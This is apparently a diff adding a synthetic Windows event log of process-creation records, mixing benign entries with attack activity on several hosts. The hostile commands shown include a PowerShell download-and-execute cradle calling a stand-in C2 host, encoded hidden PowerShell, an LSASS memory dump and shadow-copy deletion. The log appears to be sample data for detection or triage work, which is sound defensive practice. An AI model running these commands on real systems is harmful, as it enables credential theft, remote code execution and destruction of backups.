@@ -1,0 +1,58 @@
+[
+  {
+    "Timestamp": "2026-04-18T09:15:30Z",
+    "Hostname": "WKS-FINANCE-07",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "EventID": 4688,
+    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs"
+  },
+  {
+    "Timestamp": "2026-04-18T09:47:02Z",
+    "Hostname": "WKS-LEGAL-03",
+    "User": "CORP\\klarsen",
+    "EventID": 4688,
+    "CommandLine": "wscript.exe C:\\Users\\klarsen\\Downloads\\contract_agreement_4471.js"
+  },
+  {
+    "Timestamp": "2026-04-18T09:47:14Z",
+    "Hostname": "WKS-LEGAL-03",
+    "User": "CORP\\klarsen",
+    "EventID": 4688,
+    "CommandLine": "wscript.exe /b /nologo C:\\Users\\klarsen\\AppData\\Roaming\\rundata.js dGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgcGF5bG9hZCB0aGF0IHNpbXVsYXRlcyBhIEdPT1RMT0FERVIgc3RhZ2VyIHdoaWNoIG5vcm1hbGx5IGNvbnRhaW5zIGh1bmRyZWRzIG9mIGNoYXJhY3RlcnMgb2YgaGVhdmlseSBvYmZ1c2NhdGVkIGNvbnRlbnQ="
+  },
+  {
+    "Timestamp": "2026-04-18T09:48:01Z",
+    "Hostname": "WKS-LEGAL-03",
+    "User": "CORP\\klarsen",
+    "EventID": 4688,
+    "CommandLine": "cscript.exe //nologo C:\\ProgramData\\stager.vbs && powershell.exe -nop -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('hxxp://c2.example.test/next'))\""
+  },
+  {
+    "Timestamp": "2026-04-18T10:17:45Z",
+    "Hostname": "WKS-FINANCE-07",
+    "User": "CORP\\jdoe",
+    "EventID": 4688,
+    "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA="
+  },
+  {
+    "Timestamp": "2026-04-18T10:22:03Z",
+    "Hostname": "SRV-DC-01",
+    "User": "CORP\\admin.temp",
+    "EventID": 4688,
+    "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Temp\\lsass.dmp full"
+  },
+  {
+    "Timestamp": "2026-04-18T10:24:17Z",
+    "Hostname": "WKS-FINANCE-07",
+    "User": "CORP\\jdoe",
+    "EventID": 4688,
+    "CommandLine": "vssadmin.exe delete shadows /all /quiet"
+  },
+  {
+    "Timestamp": "2026-04-18T10:24:55Z",
+    "Hostname": "WKS-HR-12",
+    "User": "CORP\\msmith",
+    "EventID": 4688,
+    "CommandLine": "notepad.exe C:\\Users\\msmith\\Documents\\meeting_notes.txt"
+  }
+]
